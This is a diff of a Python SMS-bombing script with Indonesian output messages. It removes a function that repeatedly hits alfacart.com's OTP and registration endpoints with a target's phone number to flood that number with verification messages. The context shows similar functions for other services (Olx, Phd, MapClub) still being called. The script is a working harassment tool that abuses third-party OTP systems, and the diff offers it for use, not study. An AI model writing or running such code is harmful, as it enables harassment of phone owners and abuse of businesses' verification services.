@@ -67,38 +67,6 @@ try:
 			else:
 				print('\x1b[1;94m|\x1b[1;97mKIRIM SPAM \x1b[1;91mGAGAL')
 			
-	def AlfaMart(Phone, Amount):
-		for _ in range(Amount):
-		
-			sleep(5)
-			headers = {
-			'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
-			'Referer' : 'https://www.alfacart.com/login?tab=daftar&return='
-			}
-		
-			data = {
-			'fullName' : 'Yt Jejak Cyber',
-			'red' : 'customer%2Faccount',
-			'email' : 'jejak@gmail.com',
-			'password' : 'Subscribe Channel Gua Yak',
-			'isNewsletter' : 'on'
-			}
-		
-			Sess = requests.Session()
-			Sess.cookies = Cookie('.cookieslog')
-			Sess.headers = headers
-
-			postData = Sess.post('https://www.alfacart.com/getMemberInfo', data = {'email' : 'jejak@gmail.com'})
-			postData_2 = Sess.post('https://www.alfacart.com/otp/checkActiveNumber', data = {'phoneNumber' : Phone, 'email' : 'jejak@gmail.com'})
-			postData_3 = Sess.post('https://www.alfacart.com/otp/phoneNumberRegistration', data = {'phoneNumber' : Phone})
-			postData_4 = Sess.post('https://www.alfacart.com/doRegister', data = data)
-		
-			if 'responseMessage":"Nomor terverifikasi dan dapat diubah.","status":true' in postData_2.text:
-				print('\x1b[1;94m|\x1b[1;97mKIRIM SPAM \x1b[1;92mBERHASIL')
-				Sess.cookies.save()
-			
-			else:
-				print('\x1b[1;94m|\x1b[1;97mKIRIM SPAM \x1b[1;91mGAGAL')
 	
 	def Phd(Phone, Amount):
 	
@@ -153,7 +121,6 @@ try:
 			else:
 			        pass
 				Olx(Phone, 3)
-				AlfaMart(Phone, 3)
 				Phd(Phone, 3)
 				MapClub(Phone, 3)
                                 print ("\x1b[1;94m|\x1b[1;92mSELESAI")
